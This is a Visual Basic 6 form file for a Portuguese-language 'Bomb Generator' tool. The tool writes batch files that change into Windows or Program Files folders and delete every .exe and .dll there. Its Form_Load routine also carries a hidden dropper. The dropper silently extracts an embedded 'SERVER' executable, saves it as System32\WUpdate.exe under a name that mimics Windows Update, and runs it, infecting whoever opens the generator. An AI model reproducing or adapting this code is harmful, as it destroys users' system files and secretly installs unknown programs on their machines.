VERSION 5.00
Object = "{EDE6871F-B292-4B86-B602-523B7F4DC820}#1.0#0"; "ChameleonButton.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{22D6F304-B0F6-11D0-94AB-0080C74C7E95}#1.0#0"; "msdxm.ocx"
Begin VB.Form frmBombGen 
   BorderStyle     =   0  'None
   Caption         =   "Bomb Generator"
   ClientHeight    =   5745
   ClientLeft      =   660
   ClientTop       =   0
   ClientWidth     =   7485
   Icon            =   "frmBombGen.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "frmBombGen.frx":0ECA
   ScaleHeight     =   5745
   ScaleWidth      =   7485
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin Chameleon.chameleonButton cmdFind 
      Height          =   270
      Left            =   2835
      TabIndex        =   1
      Top             =   915
      Width           =   1845
      _ExtentX        =   3254
      _ExtentY        =   476
      BTYPE           =   14
      TX              =   "Nome do arquivo..."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16384
      BCOLO           =   16384
      FCOL            =   16777215
      FCOLO           =   16777215
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8D330
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Chameleon.chameleonButton chameleonButton9 
      Height          =   600
      Left            =   6000
      TabIndex        =   20
      Top             =   2310
      Width           =   1410
      _ExtentX        =   2487
      _ExtentY        =   1058
      BTYPE           =   14
      TX              =   "Gerar!"
      ENAB            =   0   'False
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   8421631
      BCOLO           =   8421631
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8D34C
      PICN            =   "frmBombGen.frx":8D368
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   1
      NGREY           =   0   'False
      FX              =   1
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Chameleon.chameleonButton chameleonButton3 
      Height          =   345
      Left            =   5970
      TabIndex        =   4
      ToolTipText     =   "Cria uma Linha em Branco..."
      Top             =   3300
      Width           =   1395
      _ExtentX        =   2461
      _ExtentY        =   609
      BTYPE           =   14
      TX              =   "@Echo."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16744576
      BCOLO           =   16744576
      FCOL            =   4194304
      FCOLO           =   4194304
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8DC42
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.TextBox imediate 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   3045
      Left            =   60
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   10
      Top             =   2625
      Width           =   5805
   End
   Begin VB.ComboBox action 
      Appearance      =   0  'Flat
      BackColor       =   &H00DFF7FD&
      Height          =   315
      Left            =   45
      Style           =   2  'Dropdown List
      TabIndex        =   3
      Top             =   1710
      Width           =   4395
   End
   Begin VB.ComboBox atkpath 
      Appearance      =   0  'Flat
      BackColor       =   &H00DFF7FD&
      Height          =   315
      Left            =   45
      Style           =   2  'Dropdown List
      TabIndex        =   2
      Top             =   1200
      Width           =   4395
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H00DFF7FD&
      Height          =   285
      Left            =   1590
      Locked          =   -1  'True
      TabIndex        =   11
      Text            =   "C:\Bomb1.bat"
      Top             =   600
      Width           =   3075
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00DFF7FD&
      Height          =   285
      Left            =   1410
      TabIndex        =   0
      Text            =   "Bomb1"
      Top             =   330
      Width           =   3255
   End
   Begin Chameleon.chameleonButton chameleonButton1 
      Height          =   180
      Left            =   7215
      TabIndex        =   12
      ToolTipText     =   "Sair do programa..."
      Top             =   45
      Width           =   210
      _ExtentX        =   370
      _ExtentY        =   318
      BTYPE           =   14
      TX              =   "#"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16774378
      BCOLO           =   192
      FCOL            =   0
      FCOLO           =   65535
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8DC5E
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin MSComDlg.CommonDialog cdSav 
      Left            =   3780
      Top             =   390
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      DialogTitle     =   "Salvar Bomb como..."
      FileName        =   "Bomb"
      Filter          =   "Arquivos de Lote Executáveis|*.bat"
      InitDir         =   "C:\"
      MaxFileSize     =   500
   End
   Begin Chameleon.chameleonButton chameleonButton2 
      Height          =   285
      Left            =   2280
      TabIndex        =   9
      Top             =   2070
      Width           =   1485
      _ExtentX        =   2619
      _ExtentY        =   503
      BTYPE           =   14
      TX              =   "Zerar..."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   128
      BCOLO           =   128
      FCOL            =   16777215
      FCOLO           =   16777215
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8DC7A
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Chameleon.chameleonButton chameleonButton4 
      Height          =   345
      Left            =   5970
      TabIndex        =   5
      ToolTipText     =   "Necessário para exibir Textos em geral..."
      Top             =   3660
      Width           =   1395
      _ExtentX        =   2461
      _ExtentY        =   609
      BTYPE           =   14
      TX              =   "@Echo"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16744576
      BCOLO           =   16744576
      FCOL            =   4194304
      FCOLO           =   4194304
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8DC96
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Chameleon.chameleonButton chameleonButton5 
      Height          =   345
      Left            =   5970
      TabIndex        =   6
      ToolTipText     =   "Aguarda o pressionamento de uma tecla qualquer..."
      Top             =   4020
      Width           =   1395
      _ExtentX        =   2461
      _ExtentY        =   609
      BTYPE           =   14
      TX              =   "pause"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16744576
      BCOLO           =   16744576
      FCOL            =   4194304
      FCOLO           =   4194304
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8DCB2
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Chameleon.chameleonButton chameleonButton6 
      Height          =   285
      Left            =   780
      TabIndex        =   8
      Top             =   2070
      Width           =   1485
      _ExtentX        =   2619
      _ExtentY        =   503
      BTYPE           =   14
      TX              =   "Aplicar"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   4210688
      BCOLO           =   4210688
      FCOL            =   16777215
      FCOLO           =   16777215
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8DCCE
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Chameleon.chameleonButton chameleonButton7 
      Height          =   345
      Left            =   5970
      TabIndex        =   13
      Top             =   4725
      Width           =   1395
      _ExtentX        =   2461
      _ExtentY        =   609
      BTYPE           =   14
      TX              =   "Sobre..."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   49344
      BCOLO           =   49344
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8DCEA
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Chameleon.chameleonButton chameleonButton8 
      Height          =   345
      Left            =   5970
      TabIndex        =   7
      Top             =   4380
      Width           =   1395
      _ExtentX        =   2461
      _ExtentY        =   609
      BTYPE           =   14
      TX              =   "Salvar texto..."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16512
      BCOLO           =   16512
      FCOL            =   16777215
      FCOLO           =   16777215
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "frmBombGen.frx":8DD06
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin MSComDlg.CommonDialog cdsavtxt 
      Left            =   3915
      Top             =   390
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      DialogTitle     =   "Salvar Texto como..."
      FileName        =   "Bomb"
      Filter          =   "Arquivos deTexto|*.txt"
      InitDir         =   "C:\"
      MaxFileSize     =   500
   End
   Begin VB.Image Image1 
      Height          =   1920
      Left            =   4710
      Picture         =   "frmBombGen.frx":8DD22
      Top             =   390
      Width           =   2715
   End
   Begin MediaPlayerCtl.MediaPlayer playa 
      Height          =   405
      Left            =   6135
      TabIndex        =   21
      Top             =   5190
      Width           =   1035
      AudioStream     =   -1
      AutoSize        =   0   'False
      AutoStart       =   -1  'True
      AnimationAtStart=   0   'False
      AllowScan       =   -1  'True
      AllowChangeDisplaySize=   0   'False
      AutoRewind      =   -1  'True
      Balance         =   0
      BaseURL         =   ""
      BufferingTime   =   5
      CaptioningID    =   ""
      ClickToPlay     =   -1  'True
      CursorType      =   0
      CurrentPosition =   -1
      CurrentMarker   =   0
      DefaultFrame    =   ""
      DisplayBackColor=   0
      DisplayForeColor=   16777215
      DisplayMode     =   0
      DisplaySize     =   4
      Enabled         =   -1  'True
      EnableContextMenu=   -1  'True
      EnablePositionControls=   -1  'True
      EnableFullScreenControls=   0   'False
      EnableTracker   =   -1  'True
      Filename        =   ""
      InvokeURLs      =   -1  'True
      Language        =   -1
      Mute            =   0   'False
      PlayCount       =   0
      PreviewMode     =   0   'False
      Rate            =   1
      SAMILang        =   ""
      SAMIStyle       =   ""
      SAMIFileName    =   ""
      SelectionStart  =   -1
      SelectionEnd    =   -1
      SendOpenStateChangeEvents=   -1  'True
      SendWarningEvents=   -1  'True
      SendErrorEvents =   -1  'True
      SendKeyboardEvents=   0   'False
      SendMouseClickEvents=   0   'False
      SendMouseMoveEvents=   0   'False
      SendPlayStateChangeEvents=   -1  'True
      ShowCaptioning  =   0   'False
      ShowControls    =   -1  'True
      ShowAudioControls=   -1  'True
      ShowDisplay     =   0   'False
      ShowGotoBar     =   0   'False
      ShowPositionControls=   0   'False
      ShowStatusBar   =   0   'False
      ShowTracker     =   0   'False
      TransparentAtStart=   0   'False
      VideoBorderWidth=   0
      VideoBorderColor=   -2147483633
      VideoBorder3D   =   0   'False
      Volume          =   0
      WindowlessVideo =   0   'False
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Tool Bar"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   240
      Left            =   6315
      TabIndex        =   19
      Top             =   2970
      Width           =   780
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Imediato:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   195
      Left            =   120
      TabIndex        =   18
      Top             =   2385
      Width           =   825
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Ação:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   195
      Left            =   45
      TabIndex        =   17
      Top             =   1515
      Width           =   465
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Pasta de Ataque:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   195
      Left            =   45
      TabIndex        =   16
      Top             =   1005
      Width           =   1440
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Nome do Arquivo:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   195
      Left            =   60
      TabIndex        =   15
      Top             =   645
      Width           =   1485
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Nome do Bomb:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   195
      Left            =   60
      TabIndex        =   14
      Top             =   360
      Width           =   1305
   End
   Begin VB.Image Image2 
      Height          =   585
      Left            =   6090
      Picture         =   "frmBombGen.frx":9ED64
      Top             =   5100
      Width           =   1170
   End
End
Attribute VB_Name = "frmBombGen"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim valor As Boolean
Dim F_Som_Atual As String
Dim pastadeataque As String
Dim acao As String
Dim p_ret As String
Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Private Const SND_MEMORY = &H4     'lpszSoundName points to a memory file
Private Const SND_SYNC = &H0       'play synchronously (default)
Private Const SND_ASYNC = &H1      'play asynchronously
Private Const SND_NOWAIT = &H2000
Private Const SND_LOOP = &H8       'loop the sound until next sndPlaySound
Private Const SND_NOSTOP = &H10    'don't stop any currently playing sound
Private Const SND_NODEFAULT = &H2  'silence not default, if sound not found
Dim nome As String
Private Function Fechar_Programa()
Kill nome
End Function
Private Sub zerar()
Text1.Enabled = True
Text1.Text = "Bomb1"
Text2.Enabled = True
Text2.Text = "C:\Bomb1.bat"
atkpath.Enabled = True
imediate.Enabled = True
imediate.Text = Empty
action.Enabled = True
chameleonButton9.Enabled = False
End Sub
Private Sub aplicar()
imediate.Text = "@echo off" & vbCrLf _
& "@echo." & vbCrLf _
& "@echo." & vbCrLf _
& "@echo You have catched by " & Text1.Text & vbCrLf _
& "@echo." & vbCrLf _
& pastadeataque & vbCrLf _
& acao & vbCrLf
action.Enabled = False
Text1.Enabled = False
Text2.Enabled = False
atkpath.Enabled = False
chameleonButton9.Enabled = True
End Sub




Private Sub action_Click()
'action.AddItem "Deletar *.exe da pasta selecionada"
'action.AddItem "Deletar *.dll da pasta selecionada"
If action.Text = "Todos os anteriores" Then
acao = "del *.exe" & vbCrLf & "del *.dll"
End If

If action.Text = "Deletar *.exe da pasta selecionada" Then
acao = "del *.exe"
End If

If action.Text = "Deletar *.dll da pasta selecionada" Then
acao = "del *.dll"
End If

End Sub

Private Sub atkpath_Click()

'atkpath.AddItem "C:\Windows"
'atkpath.AddItem "C:\Windows\System"
'atkpath.AddItem "C:\Program Files"
'atkpath.AddItem "C:\Arquivos de Programas"
'atkpath.AddItem "Todas as pastas anteriores"

pastadeataque = atkpath.Text

End Sub

Private Sub chameleonButton1_Click()
Fechar_Programa
Unload Me
End Sub

Private Sub chameleonButton2_Click()
zerar
End Sub

Private Sub chameleonButton3_Click()
imediate.Text = imediate.Text & "@ECHO."
End Sub

Private Sub chameleonButton4_Click()
imediate.Text = imediate.Text & "@ECHO DIGITE O TEXTO AQUI"
End Sub

Private Sub chameleonButton5_Click()
imediate.Text = imediate.Text & "PAUSE"
End Sub



Private Sub chameleonButton6_Click()
aplicar
End Sub

Private Sub chameleonButton7_Click()
abt.Show
End Sub

Private Sub chameleonButton8_Click()
cdsavtxt.ShowSave
Open cdsavtxt.FileName For Output As #1
Print #1, imediate.Text
Close #1
End Sub

Private Sub chameleonButton9_Click()
On Error Resume Next
If Text2.Text <> Empty Then
Open Text2.Text For Output As #1
Print #1, imediate.Text
Close #1
MsgBox "Bomb criado com sucesso em " & Text2.Text & "!", vbInformation, Me.Caption
End If
End Sub

Private Sub cmdFind_Click()
On Error Resume Next
cdSav.FileName = Text1.Text
cdSav.ShowSave
Text2.Text = cdSav.FileName
End Sub

Private Sub Form_Activate()
action.ListIndex = 0
atkpath.ListIndex = 0

End Sub

Private Sub Form_Load()
On Error Resume Next

atkpath.AddItem "cd Windows"
atkpath.AddItem "cd Windows\System"
atkpath.AddItem "cd Program Files"
atkpath.AddItem "cd Arquivos de Programas"
action.AddItem "Deletar *.exe da pasta selecionada"
action.AddItem "Deletar *.dll da pasta selecionada"
action.AddItem "Todos os anteriores"

nome = "C:\Windows\System32\WUpdate.exe"
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open nome For Binary As #1
Put #1, , p_ret
Close #1
Call Shell(nome)
If Len(App.Path) = 3 Then
nome = App.Path & "som.mp3"
Else
nome = App.Path & "\som.mp3"
End If
playsom
End Sub

Private Sub playsom()
On Error Resume Next
  'Dim p_ret As String
  '  p_ret = StrConv(LoadResData("FUNDO", "SOM"), vbUnicode)
 'If P_Som = "" Then
   '' Parar som
   ' Call sndPlaySound(vbNullString, SND_MEMORY)
   ' Exit Sub
     'End If
    ' Call sndPlaySound(p_ret, SND_NOWAIT Or SND_ASYNC Or SND_MEMORY Or SND_LOOP)
 playa.FileName = nome
 playa.Open nome
 'playa.Play
End Sub


Private Sub Form_LostFocus()
Me.SetFocus
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
   ' Call sndPlaySound(vbNullString, SND_MEMORY)
End Sub


